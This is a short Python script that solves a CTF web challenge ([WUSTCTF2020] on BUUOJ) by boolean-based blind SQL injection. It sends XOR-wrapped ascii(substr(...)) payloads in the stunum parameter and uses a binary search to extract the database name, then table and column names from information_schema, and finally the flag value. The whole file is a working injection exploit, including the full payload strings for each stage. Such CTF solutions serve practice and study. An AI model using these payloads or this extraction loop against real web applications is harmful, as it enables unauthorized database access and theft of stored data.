'''
颜值查询：https://buuoj.cn/challenges#[WUSTCTF2020]%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2
'''
import requests
import time

def start_ascii():
    database_name = ""
    # table_name = ""
    # column_name = ""
    url = "http://0b8c427d-debc-4c91-8a0a-f81144251aff.node4.buuoj.cn:81/?stunum=1"
    for i in range(1,300):
        low = 32
        high = 128
        mid = (low + high)//2
        while(low < high):
            # payload = "^(ascii(substr((select(database())),%d,1))>%d)^1#"%(i,mid)
            # payload = "^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),%d,1))>%d)^1#" % (i, mid)
            # payload = "^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)=('flag'))),%d,1))>%d)^1" % (i, mid)
            payload = "^(ascii(substr((select(group_concat(value))from(flag)),%d,1))>%d)^1" % (i, mid)
            res = requests.get(url + payload)
            if 'exists' in res.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high)//2
            # 跳出循环
        if mid == 32 or mid == 127:
            break
        database_name = database_name + chr(mid)
        # table_name = table_name + chr(mid)
        # column_name = column_name + chr(mid)
        print(database_name)

if __name__ == "__main__":
    start_ascii()